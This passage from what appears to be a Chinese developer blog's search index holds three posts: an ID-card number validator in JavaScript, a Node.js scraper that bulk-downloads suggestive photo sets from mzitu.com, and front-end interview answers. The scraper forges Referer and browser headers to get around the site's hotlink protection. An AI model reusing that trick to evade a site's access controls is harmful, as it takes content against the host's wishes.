class="string">&quot;上海&quot;</span>,</span><br><span class="line">      <span class="number">32</span>: <span class="string">&quot;江苏&quot;</span>,</span><br><span class="line">      <span class="number">33</span>: <span class="string">&quot;浙江&quot;</span>,</span><br><span class="line">      <span class="number">34</span>: <span class="string">&quot;安徽&quot;</span>,</span><br><span class="line">      <span class="number">35</span>: <span class="string">&quot;福建&quot;</span>,</span><br><span class="line">      <span class="number">36</span>: <span class="string">&quot;江西&quot;</span>,</span><br><span class="line">      <span class="number">37</span>: <span class="string">&quot;山东&quot;</span>,</span><br><span class="line">      <span class="number">41</span>: <span class="string">&quot;河南&quot;</span>,</span><br><span class="line">      <span class="number">42</span>: <span class="string">&quot;湖北 &quot;</span>,</span><br><span class="line">      <span class="number">43</span>: <span class="string">&quot;湖南&quot;</span>,</span><br><span class="line">      <span class="number">44</span>: <span class="string">&quot;广东&quot;</span>,</span><br><span class="line">      <span class="number">45</span>: <span class="string">&quot;广西&quot;</span>,</span><br><span class="line">      <span class="number">46</span>: <span class="string">&quot;海南&quot;</span>,</span><br><span class="line">      <span class="number">50</span>: <span class="string">&quot;重庆&quot;</span>,</span><br><span class="line">      <span class="number">51</span>: <span class="string">&quot;四川&quot;</span>,</span><br><span class="line">      <span class="number">52</span>: <span class="string">&quot;贵州&quot;</span>,</span><br><span class="line">      <span class="number">53</span>: <span class="string">&quot;云南&quot;</span>,</span><br><span class="line">      <span class="number">54</span>: <span class="string">&quot;西藏 &quot;</span>,</span><br><span class="line">      <span class="number">61</span>: <span class="string">&quot;陕西&quot;</span>,</span><br><span class="line">      <span class="number">62</span>: <span class="string">&quot;甘肃&quot;</span>,</span><br><span class="line">      <span class="number">63</span>: <span class="string">&quot;青海&quot;</span>,</span><br><span class="line">      <span class="number">64</span>: <span class="string">&quot;宁夏&quot;</span>,</span><br><span class="line">      <span class="number">65</span>: <span class="string">&quot;新疆&quot;</span>,</span><br><span class="line">      <span class="number">71</span>: <span class="string">&quot;台湾&quot;</span>,</span><br><span class="line">      <span class="number">81</span>: <span class="string">&quot;香港&quot;</span>,</span><br><span class="line">      <span class="number">82</span>: <span class="string">&quot;澳门&quot;</span>,</span><br><span class="line">      <span class="number">91</span>: <span class="string">&quot;国外 &quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> num = value.<span class="title function_">toUpperCase</span>();</span><br><span class="line">  <span class="keyword">if</span> (!(<span class="regexp">/(^\d&#123;15&#125;$)|(^\d&#123;17&#125;([0-9]|X)$)/</span>.<span class="title function_">test</span>(num))) &#123;</span><br><span class="line">      <span class="comment">// alert(&#x27;身份证位数格式错误！&#x27;);</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (aCity[<span class="built_in">parseInt</span>(num.<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">2</span>))] == <span class="literal">null</span>)&#123;</span><br><span class="line">      <span class="comment">// alert(&#x27;身份证格式错误！&#x27;);</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> len, re;</span><br><span class="line">  len = num.<span class="property">length</span>;</span><br><span class="line">  <span class="keyword">if</span> (len === <span class="number">15</span>) &#123;</span><br><span class="line">      re = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/^(\d&#123;6&#125;)(\d&#123;2&#125;)(\d&#123;2&#125;)(\d&#123;2&#125;)(\d&#123;3&#125;)$/</span>);</span><br><span class="line">      <span class="keyword">var</span> arrSplit = num.<span class="title function_">match</span>(re);</span><br><span class="line">      <span class="keyword">var</span> dtmBirth = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;19&#x27;</span> + arrSplit[<span class="number">2</span>] + <span class="string">&#x27;/&#x27;</span> + arrSplit[<span class="number">3</span>] + <span class="string">&#x27;/&#x27;</span> + arrSplit[<span class="number">4</span>]);</span><br><span class="line">      <span class="keyword">var</span> bGoodDay;</span><br><span class="line">      bGoodDay = (dtmBirth.<span class="title function_">getYear</span>() == <span class="title class_">Number</span>(arrSplit[<span class="number">2</span>])) &amp;&amp; ((dtmBirth.<span class="title function_">getMonth</span>() + <span class="number">1</span>) == <span class="title class_">Number</span>(</span><br><span class="line">          arrSplit[<span class="number">3</span>])) &amp;&amp; (dtmBirth.<span class="title function_">getDate</span>() == <span class="title class_">Number</span>(arrSplit[<span class="number">4</span>]));</span><br><span class="line">      <span class="keyword">if</span> (!bGoodDay) &#123;</span><br><span class="line">          <span class="comment">// alert(&#x27;身份证日期格式错误&#x27;);</span></span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> arrInt = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>);</span><br><span class="line">          <span class="keyword">var</span> arrCh = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">          <span class="keyword">var</span> nTemp = <span class="number">0</span>,</span><br><span class="line">              i;</span><br><span class="line">          num = num.<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">6</span>) + <span class="string">&#x27;19&#x27;</span> + num.<span class="title function_">substr</span>(<span class="number">6</span>, num.<span class="property">length</span> - <span class="number">6</span>);</span><br><span class="line">          <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">              nTemp += num.<span class="title function_">substr</span>(i, <span class="number">1</span>) * arrInt[i];</span><br><span class="line">          &#125;</span><br><span class="line">          num += arrCh[nTemp % <span class="number">11</span>];</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (len === <span class="number">18</span>) &#123;</span><br><span class="line">      re = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/^(\d&#123;6&#125;)(\d&#123;4&#125;)(\d&#123;2&#125;)(\d&#123;2&#125;)(\d&#123;3&#125;)([0-9]|X)$/</span>);</span><br><span class="line">      <span class="keyword">var</span> arrSplit = num.<span class="title function_">match</span>(re);</span><br><span class="line">      <span class="keyword">var</span> dtmBirth = <span class="keyword">new</span> <span class="title class_">Date</span>(arrSplit[<span class="number">2</span>] + <span class="string">&quot;/&quot;</span> + arrSplit[<span class="number">3</span>] + <span class="string">&quot;/&quot;</span> + arrSplit[<span class="number">4</span>]);</span><br><span class="line">      <span class="keyword">var</span> bGoodDay;</span><br><span class="line">      bGoodDay = (dtmBirth.<span class="title function_">getFullYear</span>() == <span class="title class_">Number</span>(arrSplit[<span class="number">2</span>])) &amp;&amp; ((dtmBirth.<span class="title function_">getMonth</span>() + <span class="number">1</span>) ==</span><br><span class="line">          <span class="title class_">Number</span>(arrSplit[<span class="number">3</span>])) &amp;&amp; (dtmBirth.<span class="title function_">getDate</span>() == <span class="title class_">Number</span>(arrSplit[<span class="number">4</span>]));</span><br><span class="line">      <span class="keyword">if</span> (!bGoodDay) &#123;</span><br><span class="line">          <span class="comment">// alert(&#x27;身份证日期格式错误&#x27;);</span></span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> valnum;</span><br><span class="line">          <span class="keyword">var</span> arrInt = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>);</span><br><span class="line">          <span class="keyword">var</span> arrCh = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">          <span class="keyword">var</span> nTemp = <span class="number">0</span>,</span><br><span class="line">              i;</span><br><span class="line">          <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">              nTemp += num.<span class="title function_">substr</span>(i, <span class="number">1</span>) * arrInt[i];</span><br><span class="line">          &#125;</span><br><span class="line">          valnum = arrCh[nTemp % <span class="number">11</span>];</span><br><span class="line">          <span class="keyword">if</span> (valnum != num.<span class="title function_">substr</span>(<span class="number">17</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">              <span class="comment">// alert(&#x27;身份证格式错误！&#x27;);</span></span><br><span class="line">              <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>用node爬点羞羞图吧~</title>
      <link href="/Blog/2019/01/24/node_js/%E7%94%A8node%E7%88%AC%E7%82%B9%E7%BE%9E%E7%BE%9E%E5%9B%BE%E5%90%A7/index/"/>
      <url>/Blog/2019/01/24/node_js/%E7%94%A8node%E7%88%AC%E7%82%B9%E7%BE%9E%E7%BE%9E%E5%9B%BE%E5%90%A7/index/</url>
      
        <content type="html"><![CDATA[<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">npm</span> i request request-promise cheerio</span><br><span class="line"><span class="built_in">npm</span> index.js</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rp = <span class="built_in">require</span>(<span class="string">&quot;request-promise&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> cheerio = <span class="built_in">require</span>(<span class="string">&quot;cheerio&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Download</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">url</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">curPage</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">main</span>(url)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">main</span>(<span class="params">url</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> pageTotal = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">getPageTotal</span>(url)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`成功获取到 <span class="subst">$&#123;pageTotal&#125;</span> 个页面，开始分页获取~`</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j=<span class="number">1</span>; j&lt;=pageTotal; j++) &#123;</span><br><span class="line">      <span class="keyword">const</span> pageList = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">getPageData</span>(url, j)</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;pageList.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> $ = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">getPage</span>(pageList[i].<span class="property">url</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`开始下载第 <span class="subst">$&#123;j&#125;</span> 页，第<span class="subst">$&#123;i + <span class="number">1</span>&#125;</span> 组的图片，共 <span class="subst">$&#123;$(<span class="string">&#x27;.pagenavi a&#x27;</span>).eq(-<span class="number">2</span>).find(<span class="string">&#x27;span&#x27;</span>).html()&#125;</span> 张......`</span>)</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">mkdirFolder</span>($, pageList[i], i)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">getPage</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">rp</span>(&#123;</span><br><span class="line">        url,</span><br><span class="line">        <span class="attr">transform</span>: <span class="keyword">function</span> (<span class="params">body</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> cheerio.<span class="title function_">load</span>(body);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">getPageTotal</span>(<span class="params">url</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> $ = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">getPage</span>(url)</span><br><span class="line">    <span class="keyword">const</span> pageTotal = $(<span class="string">&#x27;.nav-links a&#x27;</span>).<span class="title function_">eq</span>(-<span class="number">2</span>).<span class="title function_">html</span>()</span><br><span class="line">    <span class="keyword">return</span> pageTotal</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">getPageData</span>(<span class="params">url, curPage</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> pageList = []</span><br><span class="line">    <span class="keyword">const</span> $ = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">getPage</span>(url + <span class="string">&#x27;page/&#x27;</span> + curPage)</span><br><span class="line">    $(<span class="string">&#x27;#pins li img&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">      pageList.<span class="title function_">push</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;alt&#x27;</span>),</span><br><span class="line">        <span class="attr">url</span>: $(<span class="variable language_">this</span>).<span class="title function_">parent</span>().<span class="title function_">attr</span>(<span class="string">&#x27;href&#x27;</span>),</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> pageList</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">mkdirFolder</span>(<span class="params">$, pageList, i</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> perPageUrl = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">1</span>; i&lt;=$(<span class="string">&#x27;.pagenavi a&#x27;</span>).<span class="title function_">eq</span>(-<span class="number">2</span>).<span class="title function_">find</span>(<span class="string">&#x27;span&#x27;</span>).<span class="title function_">html</span>(); i++) &#123;</span><br><span class="line">      perPageUrl.<span class="title function_">push</span>(pageList.<span class="property">url</span> + <span class="string">&#x27;/&#x27;</span> + i)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> folderName = __dirname + <span class="string">&#x27;/&#x27;</span> + pageList.<span class="property">name</span></span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(folderName)) &#123;</span><br><span class="line">      fs.<span class="title function_">mkdirSync</span>(folderName)</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;pageList.name&#125;</span> 文件夹创建成功，开始写入图片~`</span>);</span><br><span class="line">      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">touchFile</span>(perPageUrl, pageList.<span class="property">name</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;pageList.name&#125;</span> 文件夹已经存在，暂不写入图片~`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">touchFile</span>(<span class="params">perPageUrl, name</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;perPageUrl.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> $ = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">getPage</span>(perPageUrl[i])</span><br><span class="line">      <span class="keyword">const</span> imgSrc = $(<span class="string">&#x27;.main-image img&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">      <span class="keyword">const</span> pageTotal = $(<span class="string">&#x27;.pagenavi a&#x27;</span>).<span class="title function_">eq</span>(-<span class="number">2</span>).<span class="title function_">find</span>(<span class="string">&#x27;span&#x27;</span>).<span class="title function_">html</span>()</span><br><span class="line">      <span class="keyword">let</span> headers = &#123;</span><br><span class="line">        <span class="title class_">Accept</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="title class_">Host</span>: <span class="string">&quot;i.meizitu.net&quot;</span>,</span><br><span class="line">        <span class="title class_">Pragma</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Proxy-Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="title class_">Referer</span>: perPageUrl[i],</span><br><span class="line">        <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.19 Safari/537.36&quot;</span></span><br><span class="line">      &#125;; <span class="comment">// 反防盗链</span></span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">rp</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: imgSrc,</span><br><span class="line">        <span class="attr">resolveWithFullResponse</span>: <span class="literal">true</span>,</span><br><span class="line">        headers</span><br><span class="line">      &#125;).<span class="title function_">pipe</span>(fs.<span class="title function_">createWriteStream</span>(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/<span class="subst">$&#123;name&#125;</span>/<span class="subst">$&#123;i+<span class="number">1</span>&#125;</span>.jpg`</span>)); <span class="comment">// 下载</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`正在下载 <span class="subst">$&#123;name&#125;</span> 图组 <span class="subst">$&#123;i+<span class="number">1</span>&#125;</span>/<span class="subst">$&#123;pageTotal&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> start = <span class="keyword">new</span> <span class="title class_">Download</span>(<span class="string">&#x27;https://www.mzitu.com/&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整理一波面试题</title>
      <link href="/Blog/2019/01/17/interview/%E6%95%B4%E7%90%86%E4%B8%80%E6%B3%A2%E9%9D%A2%E8%AF%95%E9%A2%98/index/"/>
      <url>/Blog/2019/01/17/interview/%E6%95%B4%E7%90%86%E4%B8%80%E6%B3%A2%E9%9D%A2%E8%AF%95%E9%A2%98/index/</url>
      
        <content type="html"><![CDATA[<p>###请描述cookie、sessionStorage和localStorage的区别。<br>上面提到的技术名词，都是在客户端以键值对存储的存储机制，并且只能将值存储为字符串</p><table><thead><tr><th></th><th><code>cookie</code></th><th><code>localStorage</code></th><th><code>sessionStorage</code></th></tr></thead><tbody><tr><td>由谁初始化</td><td>客户端或服务器，服务器可以使用<code>Set-Cookie</code>请求头。</td><td>客户端</td><td>客户端</td></tr><tr><td>过期时间</td><td>手动设置</td><td>永不过期</td><td>当前页面关闭时</td></tr><tr><td>在当前浏览器会话（browser sessions）中是否保持不变</td><td>取决于是否设置了过期时间</td><td>是</td><td>否</td></tr><tr><td>是否随着每个 HTTP 请求发送给服务器</td><td>是，Cookies 会通过<code>Cookie</code>请求头，自动发送给服务器</td><td>否</td><td>否</td></tr><tr><td>容量（每个域名）</td><td>4kb</td><td>5MB</td><td>5MB</td></tr><tr><td>访问权限</td><td>任意窗口</td><td>任意窗口</td><td>当前页面窗口</td></tr></tbody></table><h6 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h6><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</a></li><li><a href="http://tutorial.techaltum.com/local-and-session-storage.html">http://tutorial.techaltum.com/local-and-session-storage.html</a></li></ul><h3 id="请描述-lt-script-gt-、-lt-script-async-gt-和-lt-script-defer-gt-的区别。"><a href="#请描述-lt-script-gt-、-lt-script-async-gt-和-lt-script-defer-gt-的区别。" class="headerlink" title="请描述&lt;script&gt;、&lt;script async&gt;和&lt;script defer&gt;的区别。"></a>请描述<code>&lt;script&gt;</code>、<code>&lt;script async&gt;</code>和<code>&lt;script defer&gt;</code>的区别。</h3><ul><li><code>&lt;script&gt;</code> - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。</li><li><code>&lt;script async&gt;</code> - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用<code>async</code>，比如用作页面统计分析。</li><li><code>&lt;script defer&gt;</code> - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含<code>defer</code>的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。</li></ul><p>注意：没有<code>src</code>属性的脚本，<code>async</code>和<code>defer</code>属性会被忽略。</p><h6 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a><a href="https://github.com/yangshun/front-end-interview-handbook/blob/master/Translations/Chinese/questions/html-questions.md#%E5%8F%82%E8%80%83-6"></a>参考</h6><ul><li><a href="http://www.growingwiththeweb.com/2014/02/async-vs-defer-attributes.html">http://www.growingwiththeweb.com/2014/02/async-vs-defer-attributes.html</a></li><li><a href="https://stackoverflow.com/questions/10808109/script-tag-async-defer">https://stackoverflow.com/questions/10808109/script-tag-async-defer</a></li><li><a href="https://bitsofco.de/async-vs-defer/">https://bitsofco.de/async-vs-defer/</a></li></ul><h3 id="为什么最好把-CSS-的-lt-link-gt-标签放在-lt-head-gt-lt-head-gt-之间？为什么最好把-JS-的-lt-script-gt-标签恰好放在-lt-body-gt-之前，有例外情况吗？"><a href="#为什么最好把-CSS-的-lt-link-gt-标签放在-lt-head-gt-lt-head-gt-之间？为什么最好把-JS-的-lt-script-gt-标签恰好放在-lt-body-gt-之前，有例外情况吗？" class="headerlink" title="为什么最好把 CSS 的&lt;link&gt;标签放在&lt;head&gt;&lt;/head&gt;之间？为什么最好把 JS 的&lt;script&gt;标签恰好放在&lt;/body&gt;之前，有例外情况吗？"></a>为什么最好把 CSS 的<code>&lt;link&gt;</code>标签放在<code>&lt;head&gt;&lt;/head&gt;</code>之间？为什么最好把 JS 的<code>&lt;script&gt;</code>标签恰好放在<code>&lt;/body&gt;</code>之前，有例外情况吗？</h3><p><strong>把<code>&lt;link&gt;</code>放在<code>&lt;head&gt;</code>中</strong></p><p>把<code>&lt;link&gt;</code>标签放在<code>&lt;head&gt;&lt;/head&gt;</code>之间是规范要求的内容。此外，这种做法可以让页面逐步呈现，提高了用户体验。将样式表放在文档底部附近，会使许多浏览器（包括 Internet Explorer）不能逐步呈现页面。一些浏览器会阻止渲染，以避免在页面样式发生变化时，重新绘制页面中的元素。这种做法可以防止呈现给用户空白的页面或没有样式的内容。</p><p><strong>把<code>&lt;script&gt;</code>标签恰好放在<code>&lt;/body&gt;</code>之前</strong></p><p>脚本在下载和执行期间会阻止 HTML 解析。把<code>&lt;script&gt;</code>标签放在底部，保证 HTML 首先完成解析，将页面尽早呈现给用户。</p><p>例外情况是当你的脚本里包含<code>document.write()</code>时。但是现在，<code>document.write()</code>不推荐使用。同时，将<code>&lt;script&gt;</code>标签放在底部，意味着浏览器不能开始下载脚本，直到整个文档（document）被解析。也许，对此比较好的做法是，<code>&lt;script&gt;</code>使用<code>defer</code>属性，放在<code>&lt;head&gt;</code>中。</p><h6 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a><a href="https://github.com/yangshun/front-end-interview-handbook/blob/master/Translations/Chinese/questions/html-questions.md#%E5%8F%82%E8%80%83-7"></a>参考</h6><ul><li><a href="https://developer.yahoo.com/performance/rules.html#css_top">https://developer.yahoo.com/performance/rules.html#css_top</a></li></ul><h3 id="CSS-选择器的优先级是如何计算的？"><a href="#CSS-选择器的优先级是如何计算的？" class="headerlink" title="CSS 选择器的优先级是如何计算的？"></a>CSS 选择器的优先级是如何计算的？</h3><p>浏览器通过优先级规则，判断元素展示哪些样式。优先级通过 4 个维度指标确定，我们假定以<code>a、b、c、d</code>命名，分别代表以下含义：</p><ol><li><code>a</code>表示是否使用内联样式（inline style）。如果使用，<code>a</code>为 1，否则为 0。</li><li><code>b</code>表示 ID 选择器的数量。</li><li><code>c</code>表示类选择器、属性选择器和伪类选择器数量之和。</li><li><code>d</code>表示标签（类型）选择器和伪元素选择器之和。</li></ol><p>优先级的结果并非通过以上四个值生成一个得分，而是每个值分开比较。<code>a、b、c、d</code>权重从左到右，依次减小。判断优先级时，从左到右，一一比较，直到比较出最大值，即可停止。所以，如果<code>b</code>的值不同，那么<code>c</code>和<code>d</code>不管多大，都不会对结果产生影响。比如<code>0，1，0，0</code>的优先级高于<code>0，0，10，10</code>。</p><p>当出现优先级相等的情况时，最晚出现的样式规则会被采纳。如果你在样式表里写了相同的规则（无论是在该文件内部还是其它样式文件中），那么最后出现的（在文件底部的）样式优先级更高，因此会被采纳。</p><p>在写样式时，我会使用较低的优先级，这样这些样式可以轻易地覆盖掉。尤其对写 UI 